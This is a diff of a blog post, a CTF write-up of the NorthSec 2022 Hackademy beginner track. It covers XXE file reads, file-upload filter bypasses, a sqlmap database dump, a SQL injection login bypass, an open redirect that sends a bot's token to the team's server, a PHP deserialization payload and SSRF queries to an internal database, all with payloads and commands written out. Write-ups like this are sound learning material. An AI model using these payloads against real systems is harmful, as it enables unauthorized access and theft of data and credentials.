@@ -3,9 +3,11 @@ title: "Northsec Hackademy"
 date: 2022-05-28
 ---
 
-This year I participated again in NorthSec CTF. The events leading to this CTF are fun, some warmup challenges announced in the Discord. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allow people to catch up. 
+This year I participated again in NorthSec CTF. In the weeks prior to the events small challenges were annouced called warmups. There was signal analysis, git secret recovery, code audit, fuzzing, some NFT Shenanigan and more. Some were pretty rough but there was plenty hints that were added to allow people to catch up. 
 
-As for the CTF itself, it was insanely hard except for the beginner track: Hackademy. It was the same as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. Here is the writeup for the Hackademy track.
+As for the CTF itself, the scenario was that you were in pentesting a new startup company involved in NFT, metaverse and crypto currencies. Most of the challenges were insanely hard but like previous year there was trivia questions related to hackers movie and the beginner track: Hackademy. It was the same track as last year with some minor changes and I took the time to complete every challenge, asking for help to solve some of them. 
+
+Here is the writeup for the Hackademy track.
 
 ![Hackademy website](/will-hack-for-coffee/assets/images/nsec2022/hackademy.png)
 
@@ -74,25 +76,16 @@ Last of these challenge use XML external entity injection (XXE). Hopefully I had
 
 ![Inclusion 3 source code](/will-hack-for-coffee/assets/images/nsec2022/inclusion3-source.png)
 
-I sent the POST from the underlying Javascript to my Burp Repeater tab and edited the body like so:
-````
-<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file://etc/passwd" > ]>
-<function>
-    <getConversation>
-        &ext;
-    </getConversation>
-</function>
-````
-So the content of the passwd file is shown in the ext variable on the website.
+I sent the POST from the underlying Javascript to my Burp Repeater tab and edited the body paramter so the content of the passwd file is shown in the ext variable on the website.
 ![XXE](/will-hack-for-coffee/assets/images/nsec2022/xxe.png)
 
 ## Upload 101, 102, 103 and 104
 
-So here the challenges are to evade validation and upload a php file with remote code execution.
+So here the challenges are to upload a php file (with potential remote code execution) while evading validation.
 
 ![File upload website](/will-hack-for-coffee/assets/images/nsec2022/file-upload.png)
 
-So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted as PHP and my code could be executed. The validation probably only check if the allowed extension was in the filename.
+So for the first challenge I renamed my file to reverse.jpg.php. The file will be interpreted as PHP and my code could be executed. The validation probably only checked if the allowed extension was in the filename.
 
 For the second challenge I needed to modify the Content-Type header for image/jpeg with the following value:
 
@@ -104,11 +97,15 @@ For the third challenge I submitted the same file and it warn me that the signat
 
 The resulting forged file was uploaded (again modifying the Content-Type header).
 
-For the fourth upload challenge I renamed the file to rev.png.php3 a less used but valid PHP extension. The validation must have been a blacklist on .php extension.
+For the fourth upload challenge I renamed the file to rev.png.php3 a less known but still valid PHP extension. The validation must have been a blacklist on .php extension.
 
 ## SQL 101 and 102
 
-A nice tip that I learned from Burp is that you can submit a single quote (') to a form to test for SQL injection. If there is an error there a strong possibility that it's vulnerable to SQL injection. I didn't bother for this as I already knew there was a SQL injection. Last year I suggested to a teammate that he could have used [SQLmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. From what I understand it's a blind SQL injection so I tried a couple of command but here the one that worked for me:
+Those two challenges were about SQL injection and the website consisted of a login form. A nice tip that I learned from Burp is that you can submit a single quote (') to a form to test for SQL injection. If there is an error there a strong possibility that it's vulnerable to SQL injection. The first challenge was an authentication bypass: 
+
+![SQL injection 102](/will-hack-for-coffee/assets/images/nsec2022/sql-injection102.png)
+
+It worked because the query returns one (empty) row. It also gives us a hint for the other challenge. Last year I suggested to a teammate that he could have used [SQLmap to solve that challenge](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellQueryLanguage/#flag-1) but I didn't took the time to try it myself. From what I understand it's a blind SQL injection so I tried a couple of command but here the one that worked for me:
 ````
 └─$ sqlmap -u http://chal4.hackademy.ctf --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ
         ___
@@ -178,15 +175,11 @@ Table: fl4G_1s_H3re
 +-----------------------------------------------------------------------------------------------------------------------------+
 ...
 ````
-Revealing the flag in the table fl4G_1s_H3re. The next challenge was an authentication bypass (well I already had the password of user admin but yeah). Here is the payload I used:
-````
-' UNION SELECT '', '', '' --
-````
-It works because the query returns one (empty) row.
+SQLmap exfiltrated all the database and revealead the flag in the table fl4G_1s_H3re. 
 
 ## Open redirect 101
 
-Open redirect is that even a vulnerability? I browsed the site and there was two links:
+I tought open redirect was a minor vulnerability? I browsed the site and there was two links:
 
 ![Open redirect 101](/will-hack-for-coffee/assets/images/nsec2022/open-redirect101.png)
 
@@ -194,7 +187,7 @@ Navigating the first link and looking at Burp I saw that there was a redirect co
 
 ![JWT redirect](/will-hack-for-coffee/assets/images/nsec2022/jwt-redirect.png)
 
-You can use [jwt.io](jwt.io) to check what's inside a token and confirm it's a JWT. The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the nsec network so I redirected him there:
+You can use [jwt.io](jwt.io) to check what's inside a token and confirm it's a JWT. The next link on the website allows you to provide an URL and the "Grand master pentester" will visit it. Our team owned a small server on the nsec network so I redirected him there instead:
 
 http://chal5.hackademy.ctf/?sub_url=http://shell.ctf
 
@@ -213,6 +206,9 @@ I can see his credentials and I used it to log as my "master".
 
 A simple Hello word! page with the source available. There is also weird s parameter that I will tamper with later.
 
+![Serialize 101](/will-hack-for-coffee/assets/images/nsec2022/serialize101.png)
+
+Looking at the source:
 ````
 <?php
     if(isset($_GET["source"])){
@@ -256,7 +252,7 @@ A simple Hello word! page with the source available. There is also weird s param
 </html>
 ````
 
-It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. The flag is in the source code but it's replaced by x if it's viewed from the link. It seems there is a function in PHP you can use to [serialize](https://www.php.net/manual/en/function.serialize.php) values. The s parameter contains a class that is to be de-serialized. It will then automatically launch the __wakeup function which launch the WelcomeMessage function. What I will do is create a new class that will call the GiveMeFlagPrettyPlease function instead. A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
+The flag is in the source code but it's replaced by x if it's viewed from the link. It took me some time to understand this challenge even if I [ripped](https://erichogue.ca/2021/05/NorthSec2021WriteupSpellrialize/) it from a friend. PHP use the [serialize](https://www.php.net/manual/en/function.serialize.php) function so it can pass objects as strings in the parameters. It will then automatically launch the __wakeup function that will execute the WelcomeMessage function. What I will do is create a new object that will call the GiveMeFlagPrettyPlease function instead (by setting the property of the object). A [wise man](https://www.mindkind.org/index.php) told me that I could use php in kali to run script, so I created this little script: 
 ````
 <?php
     class Hackademy{
@@ -270,11 +266,11 @@ Ran it:
 └─$ php serialize.php  
 Tzo5OiJIYWNrYWRlbXkiOjE6e3M6MTU6IgBIYWNrYWRlbXkAY2FsbCI7czoyMjoiR2l2ZU1lRmxhZ1ByZXR0eVBsZWFzZSI7fQ== 
 ````
-I then used that base64 string in the s parameter and got the flag.
+Then used that base64 string in the s parameter and got the flag.
 
-## (Server Side Request) Forgery 101, 102 and 103
+## Server Side Request Forgery 101, 102 and 103
 
-This website allows you to send some commands like ping and such. But you can also use a less well-known protocol called file and obtain file located on the server and it will not be interpretated. Let's take a look at the config file of the API:
+This website allows you to send some commands like ping and such. But you can also use any other protocol and obtain file located on the server and it will not be interpretated. Let's take a look at the config file of the API:
 
 ![Server Side Request Forgery 101](/will-hack-for-coffee/assets/images/nsec2022/ssrf101.png)
 
@@ -334,11 +330,11 @@ So that's where the database is but it can only be accessed locally from the ser
         die();
     }
 ````
-Let's query the table of that database (we can guess it's a PostgreSQL database from the user) using a built-in database table:
+Let's query the table of that database (we can guess it's a PostgreSQL database from the user) using a default database table:
 
 ![Server Side Request Forgery 102](/will-hack-for-coffee/assets/images/nsec2022/ssrf102.png)
 
-Then I used that parameter to get the flag:
+Then I used those parameters to get the flag:
 ````
 user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_25bb3839f80731bb
 ````
